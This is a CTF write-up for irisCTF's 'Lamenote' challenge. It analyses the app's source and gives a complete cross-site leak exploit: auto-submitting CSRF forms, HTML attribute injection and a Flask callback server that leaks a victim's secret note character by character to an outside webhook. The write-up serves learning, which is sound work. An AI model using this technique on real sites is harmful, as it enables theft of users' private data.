---
title: "[Lamenote] - irisCTF"
tags:
  - CTF
  - Write-up
  - xs-leaks
categories:
  - CTF
  - Write Up
---
![[Screenshot 2024-01-21 at 13.26.26.png]]

# Prologue
An online CTF competition by IrisSec, this competition is the first CTF in 2024.

Notes: 
- When testing in the local, we need to disable third-party cookies first.[^1]
- HTTPS is needed to host the exploit
- For the sake of debugging, I changed a little bit of the script
```diff
diff --color -r lamenote 2/chal.py lamenote/chal.py
8c8
< host = re.compile("^[a-z0-9\.:]+$")
---
> host = re.compile("^[a-z0-9\.:-]+$")
27a28,31
>         if parsed.port == None:
>             port = 80
>         else:
>             port = parsed.port
29c33
<             response.headers["Content-Security-Policy"] += "img-src " + parsed.scheme + "://" + parsed.hostname + ";"
---
>             response.headers["Content-Security-Policy"] += "img-src " + parsed.scheme + "://" + parsed.hostname + ":" + str(port) + ";"
105a110,111
> 
> app.run('0.0.0.0', "1212")
\ No newline at end of file
```

![[lamenote-adminbot.tar.gz]]
![[lamenote.tar.gz]]
# Write Up
## TL;DR Solution

The player needs to change CSRF by creating a note with all possible characters. After that, by making use of the search feature in the app, if the search result is multiple it won't render the image.
## Detailed Explanation

### Reading the Code

We were given two source files, the admin bot and the application.
![[Screenshot 2024-01-21 at 13.47.32.png]]
![[Screenshot 2024-01-21 at 13.48.02.png]]

Looking at the bot source, We can see the bot is writing the flag into the note and saving it
```js
// ./lamenote-adminbot/bot.js#L32-L75
// 8< -- Snip -- >8
async function load_url(socket, data) {
  let url = data.toString().trim();
  console.log(`checking url: ${url}`);
  if (!url.startsWith('http://') && !url.startsWith('https://')) {
    socket.state = 'ERROR';
    socket.write('Invalid scheme (http/https only).\n');
    socket.destroy();
    return;
  }
  socket.state = 'LOADED';

  const context = await browser.createIncognitoBrowserContext();
  const page = await context.newPage();
  await page.goto("https://lamenote-web.chal.irisc.tf/");
  const frameWrapper = await page.waitForSelector('iframe');
  const frame = await frameWrapper.contentFrame();
  await frame.type('input[name=title]', 'Flag');
  await frame.type('input[name=text]', 'irisctf{FAKEFLAGFAKEFLAG}');
  await frame.type('input[name=image]', 'https://i.imgur.com/dQJOyoO.png');
  await frame.click('form[method=post] button[type=submit]');
  await page.waitForTimeout(1000);
  await frameWrapper.dispose();

  socket.write(`Loading page ${url}.\n`);
  setTimeout(()=>{
    try {
      context.close();
      socket.write('timeout\n');
      socket.destroy();
    } catch (err) {
      console.log(`err: ${err}`);
    }
  }, BOT_TIMEOUT);
  await page.setExtraHTTPHeaders({"ngrok-skip-browser-warning": "please"});
  await page.goto(url);
}
// 8< -- Snip -- >8
```

On the front-end side, the application just iframe-ing the endpoint `/home` with `sandbox`
```html
<!-- ./lamenote/index.html#L16 -->

<iframe src="/home" width=200 height=200 sandbox="allow-forms allow-same-origin">
```


Understanding the server-side code, we can see interesting few things
- There's a check request, where all the source requests need to be inside the iframe
```python
# ./lamenote/chal.py#L14-L20
def check_request(f):
    @wraps(f)
    def inner(*a, **kw):
        secFetchDest = request.headers.get('Sec-Fetch-Dest', None)
        if secFetchDest and secFetchDest != 'iframe': return "Invalid request"
        return f(*a, **kw)
    return inner
```

- The CSP is very strict, We were able to control the `g.image_url`, but due to strict regex, we won't have CSP Injection. Also, it's vulnerable to clickjacking.
```python
# ./lamenote/chal.py#L8
host = re.compile("^[a-z0-9\.:]+$")

# 8< -- Snip -- >8

# ./lamenote/chal.py#L22-L33
@app.after_request
def csp(response):
    response.headers["Content-Security-Policy"] = "default-src 'none'; frame-src 'self';";
    if "image_url" in g:
        url = g.image_url
        parsed = urlparse(url)
        if host.match(parsed.netloc) and parsed.scheme in ["http", "https"]:
            response.headers["Content-Security-Policy"] += "img-src " + parsed.scheme + "://" + parsed.hostname + ";"
    response.headers["Cross-Origin-Opener-Policy"] = "same-origin"
    response.headers["Cross-Origin-Resource-Policy"] = "same-origin"
    response.headers["Cross-Origin-Embedder-Policy"] = "require-corp"
    return response
```

- We don't have HTML Injection / XSS but we still have HTML attribute injection
```python
# ./lamenote/chal.py#L52-L58
@app.route("/create", methods=["POST"])
@check_request
def create():
    if "<" in request.form.get("text", "(empty)") or \
            "<" in request.form.get("title", "(empty)") or \
            "<" in request.form.get("image", ""):
        return "Really?"

# 8< -- Snip -- >8

# ./lamenote/chal.py#L71-L77
def render_note(note):
    data = "<!DOCTYPE html><body><b>" + note["title"] + "</b><br/>" + note["text"]
    if note["image"] is not None:
        g.image_url = note["image"]
        data += "<br/><img width='100%' src='" + note["image"] + "' crossorigin />"
    data += "</body>"
    return data
```

 - When creating note,
	- There's a CSRF when creating note. Because the cookies flag is `samesite=None`
	- We can put image in the note, 
```python
# ./lamenote/chal.py#L68
r.set_cookie('user', user, secure=True, httponly=True, samesite='None')
```

- The most interesting part is on search note. So, If we search for a note where it only results in **one note**. Then, It will render the note. But, if the **note is multiple**, it only renders the title.
```python
# ./lamenote/chal.py#L86-L105
@app.route("/search")
@check_request
def search():
    query = request.args.get("query", "")
    user = request.cookies.get("user", None)
    results = []
    notes_copy = copy.deepcopy(NOTES)
    for note in notes_copy.values():
        if note["owner"] == user and (query in note["title"] or query in note["text"]):
            results.append(note)
            if len(results) >= 5:
                break

    if len(results) == 0:
        return "<!DOCTYPE html><body>No notes.</body>"

    if len(results) == 1:
        return render_note(results[0])
    
    return "<!DOCTYPE html><body>" + "".join("<a href='/note/" + note["id"] + "'>" + note["title"] + "</a> " for note in results) + "</body>"
```

- There's no interesting part in the viewing note.

### Exploitation

To summarize our findings before, We found a few things:
- The request must be through iframe;
- CSRF when creating notes;
- If the searching note is only one, render the note.

So, in the third point, it will become our oracle for xs-leaks.

Example:

```
All Notes:
Body: FLAG{FAKEFLAG}; img_url: http://someimage/
Body: FLAG{A        ; img_url: http://exploit-server/
Body: FLAG{B        ; img_url: http://exploit-server/
...
Body: FLAG{F        ; img_url: http://exploit-server/
...

Search Notes:
query=FLAG{A => The image will hitting our server. Because, search note results is only one 
query=FLAG{B => The image will hitting our server. Because, search note results is only one 
query=FLAG{F => The image won't hitting our server. Because, search note results is multiple
```

So, we already found the oracle for leaking the flag, the only one left is the automation part.

And here is the the flow of automation part, `[C]` mean is a `client-side` and `[S]` mean is `server-side`:
1. `[C]` Fetch the known flag to the exploit-server;
2. `[C]` Create lot of notes by make use of CSRF with known prefix inside of iframe;
3. `[C]` When we creating notes, app will redirecting our navigation into `/note/uuid`. To make it easier to disintegrate between exploit firing at viewing note and searching note, add attribute [referrerpolicy](https://developer.mozilla.org/en-US/docs/Web/API/HTMLAnchorElement/referrerPolicy) (`referrerpolicy='unsafe-url`) by making use of HTML attribute injection;
4. `[C]` Delete the CSRF iframe, and replace it with the search feature;
5. `[S]` If referrer has `/note/uuid` ignore the collecting chars;
6. `[S]` If not, then put it into list;
7. `[C]` make a request to the exploit-server for checking which characters that not hitting  the exploit-server;
8. `[S]` find a character that not exists our charset, if true then it means its the correct flag;
9. `[C]` loop;

And this is the final script

Client-Side
```js
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <iframe id="stuff" frameborder="0"></iframe>
    <script>
        function makeid(length) {
            let result = '';
            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            const charactersLength = characters.length;
            let counter = 0;
            while (counter < length) {
                result += characters.charAt(Math.floor(Math.random() * charactersLength));
                counter += 1;
            }
            return result;
        }

        let webhook = "https://ngrok/"
        let remote = "https://domain.com/"
        const sleep = ms => new Promise(r => setTimeout(r, ms));
        async function check_known() {
            let res = await fetch(webhook + "known")
            return res.text()
        }
        async function main (){
            let charset = "abcdefghijklmnopqrstuvwxyz_}"
            await check_known().then(async function(r){
                if(r.endsWith("}")){ return 1; }
                for(let _ in charset){
                    data_csrf = `data:text/html,
                            <html\x3e
                    <body\x3e
                        <form action="${remote}create" method="POST">
                        <input type="hidden" name="title" value="${makeid(32)}" />
                        <input type="hidden" name="text" value="${r+charset[_]}" />
                        <input type="hidden" name="image" value="${webhook}iterate?c=${r + charset[_]}&' referrerpolicy='unsafe-url" />
                        <input type="submit" value="Submit request" />
                        </form\x3e
                        <script\x3e
                        document.forms[0].submit();
                        <\/script\x3e
                    </body\x3e
                    </html\x3e`
                    console.log(r + charset[_])
                    let iframeWrap = document.createElement('iframe')
                    iframeWrap.src = data_csrf
                    iframeWrap.id = "nyx_"+(charset[_]).replace("}", "_")
                    document.body.appendChild(iframeWrap)
                }
                await sleep(1*1000)
                    
                for(let _ in charset){
                    let iframeWrap = document.body.querySelector("#nyx_"+(charset[_]).replace("}", "_"))
                    iframeWrap.src = remote + `search?query=${r + charset[_]}`
                }

                await sleep(3*1000)
                await fetch(webhook + `iterate?c=CHECK`)
                location.reload()
            })
        }
        main()
    </script>
</body>
</html>
```

Server-side
```python
from flask import *
import string

chars = []
known = "irisctf{"
app = Flask(__name__)

@app.after_request
def csp(response):
    response.headers["Access-Control-Allow-Origin"] = "*"
    return response

@app.route("/")
def index():
    return "idklol"

@app.route("/start_exp")
def exp():
    return send_file("index.html")

@app.route("/known")
def known_():
    global known
    print(known)
    return known

def check_not_exists():
    global chars, known
    charset = list(string.ascii_lowercase + "_}")
    for x in chars:
        if x in charset:
            charset.remove(x)
    print(charset)
    known += charset[0]
    print(known)
    chars = []
    pass

@app.route("/iterate", methods=["GET", "OPTIONS"])
def home():
    global chars
    char = request.args.get("c", "(empty)").replace(known, "")
    ref = request.headers.get("Referer", "")
    print(ref)
    if "/note/" in ref:
        return ""
    if(char == 'CHECK'):
        check_not_exists()
    elif(char == '(empty)'):
        print("SOMETHING WENT WRONG")
    else:
        print(chars)
        chars.append(char)
    return ""

app.run("0.0.0.0", 80)
```

[^1]:  [The next step toward phasing out third-party cookies in Chrome](https://blog.google/products/chrome/privacy-sandbox-tracking-protection/)